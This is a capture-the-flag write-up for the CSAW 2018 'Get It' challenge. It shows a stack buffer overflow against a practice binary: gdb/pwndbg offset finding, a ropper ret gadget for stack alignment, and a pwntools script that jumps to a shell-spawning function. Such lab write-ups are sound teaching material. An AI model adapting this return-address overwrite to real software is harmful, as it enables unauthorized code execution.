
# Get It

`give_shell()` function at `0x4005b6` that spawns a bash shell.

```c
void give_shell(void)

{
  system("/bin/bash");
  return;
}
```

Generate a cyclic pattern and pass it as input to clobber the return address.

```
gdb ./get_it

pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

pwndbg> r a
Starting program: /home/wither/NOTES/CSAW/2018/Get-It/get_it a
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Do you gets it??
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
...
 ► 0x4005f7 <main+48>    ret                                <0x6161616161616166>
...
```

Look up the pattern `0x6161616161616166` to find the offset of **40** bytes.

```
pwndbg> cyclic -l 0x6161616161616166
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)

Found at offset 40
```

Using a padding of **40** bytes + the address of the `/bin/bash` call in the `give_shell()` function at `0x0x4005b6` doesn't work, because $rsp is not aligned to **16 bytes**.

```
pwndbg> run < <(python3 -c 'import sys,pwn;sys.stdout.buffer.write(b"A"*40 + pwn.p64(0x4005b6))')
...
 ► 0x7ffff7c5843b <do_system+363>    movaps xmmword ptr [rsp + 0x50], xmm0     <[0x7fffffffd968] not aligned to 16 bytes>
...
```

Use ropper to find the address of a `ret` gadget at `0x400451`.

```shell
ropper --file get_it --search "ret"

[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: get_it
0x0000000000400451: ret;

```

Add it in front of the payload to **pop** the misaligned bytes, and return to the `system` function that gives us a shell. 

Note: you need something at the end like the q `))')q` for the `/bin/bash` pipe to stay open and accept a command.

```
pwndbg> run < <(python3 -c 'import sys,pwn;sys.stdout.buffer.write(b"A"*40 + pwn.p64(0x400451) + pwn.p64(0x4005b6))')q

Starting program: /usr/bin/bash < <(python3 -c 'import sys,pwn;sys.stdout.buffer.write(b"A"*40 + pwn.p64(0x400451) + pwn.p64(0x4005b6))')q
/bin/bash: line 1: /dev/fd/63q: No such file or directory
During startup program exited with code 1.
pwndbg> Exception ignored in: <_io.TextIOWrapper name='<stdout>' mode='w' encoding='utf-8'>
BrokenPipeError: [Errno 32] Broken pipe
ls
exploit.py  get_it  README.md

```

Automate this with Python and pwntools

```python
#!/usr/bin/python3

from pwn import *

context.log_level = 'ERROR'

context.binary = elf = ELF("./get_it", checksec=False)
p = process()

payload = b"A"*40 + p64(0x400451) + p64(0x4005b6)

p.sendline(payload)
p.interactive()
```

And get a shell.

```shell
python3 exploit.py

Do you gets it??
$ ls
exploit.py  get_it  README.md
```